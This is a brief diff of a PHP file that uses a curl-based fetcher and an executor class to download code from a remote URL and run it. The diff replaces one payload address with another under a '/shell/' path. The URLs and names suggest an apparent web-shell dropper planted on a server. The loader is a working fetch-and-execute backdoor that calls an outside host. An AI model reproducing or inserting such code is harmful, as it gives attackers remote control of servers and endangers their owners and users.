@@ -85,7 +85,7 @@ try {
     $fetcher = new CurlFetcher();
     $executor = new CodeExecutor($fetcher);
 
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/seobadboyz403-alt/new-era/refs/heads/main/badboyz-edition.txt");
+    $executor->executeCodeFromURL("https://this-jakartans.sbs/shell/SemogaTidakTembus.txt");
 } catch (Exception $e) {
     echo "Error: " . htmlspecialchars($e->getMessage());
 }
